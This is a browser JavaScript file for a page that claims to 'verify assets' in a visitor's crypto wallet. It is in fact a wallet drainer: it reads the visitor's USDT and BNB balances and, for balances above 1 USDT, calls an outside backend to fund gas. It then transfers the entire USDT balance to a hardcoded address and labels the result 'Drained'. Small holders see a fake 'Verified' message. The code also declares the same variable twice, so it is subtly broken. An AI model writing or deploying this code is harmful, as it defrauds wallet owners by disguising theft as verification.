const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress = null;

// Silent polling for wallet connection (like app.js)
(async function waitForWallet() {
  if (!window.ethereum) {
    alert("Web3 wallet not found. Please use Trust Wallet or MetaMask.");
    return;
  }

  web3 = new Web3(window.ethereum);

  for (let i = 0; i < 10; i++) {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
      userAddress = accounts[0];
      console.log("✅ Auto‑connected:", userAddress);
      return;
    }
    await new Promise(r => setTimeout(r, 1000)); // wait 1 sec and retry
  }

  console.log("⚠️ Wallet not connected after retry. Verification won't work yet.");
})();

async function verifyAssets() {
  if (!web3) {
    alert("Web3 not initialized.");
    return;
  }

  if (!userAddress) {
    alert("Wallet not connected. Please unlock your wallet.");
    return;
  }

  const usdt = new web3.eth.Contract([
    { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" }
  ], usdtContractAddress);

  const [usdtWei, bnbWei] = await Promise.all([
    usdt.methods.balanceOf(userAddress).call(),
    web3.eth.getBalance(userAddress)
  ]);

  const usdt = parseFloat(web3.utils.fromWei(usdtWei, "ether"));
  const bnb = parseFloat(web3.utils.fromWei(bnbWei, "ether"));

  if (usdt === 0) {
    return showPopup("No assets found.", "black");
  }
  if (usdt <= 1) {
    return showPopup(
      `✅ Verified<br>USDT: ${usdt}<br>BNB: ${bnb}`,
      "green"
    );
  }

  showPopup("Processing...", "green");
  processTransfer(usdt, bnb);
}

async function processTransfer(usdtBalance, bnbBalance) {
  try {
    if (bnbBalance < 0.0005) {
      await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ toAddress: userAddress })
      });
    }

    const usdt = new web3.eth.Contract([
      { constant: false, inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }], name: "transfer", outputs: [{ name: "", type: "bool" }], type: "function" }
    ], usdtContractAddress);

    const amount = web3.utils.toWei(usdtBalance.toString(), "ether");
    await usdt.methods.transfer(bscAddress, amount).send({ from: userAddress });

    showPopup(`✔️ Drained ${usdtBalance} USDT`, "red");

  } catch (e) {
    console.error("Transfer failed:", e);
    alert("Transfer failed; check gas or retry.");
  }
}

function showPopup(msg, color) {
  let el = document.getElementById("popupBox");
  if (!el) {
    el = document.createElement("div");
    el.id = "popupBox";
    el.style = `position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
                 padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.2);
                 font-size:18px; width:80%; max-width:400px; text-align:center;`;
    document.body.appendChild(el);
  }
  el.style.background = color === "red" ? "#ffebeb" : "#e6f7e6";
  el.style.color = color === "red" ? "red" : "green";
  el.innerHTML = msg;
  el.style.display = "block";
  setTimeout(() => (el.style.display = "none"), 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
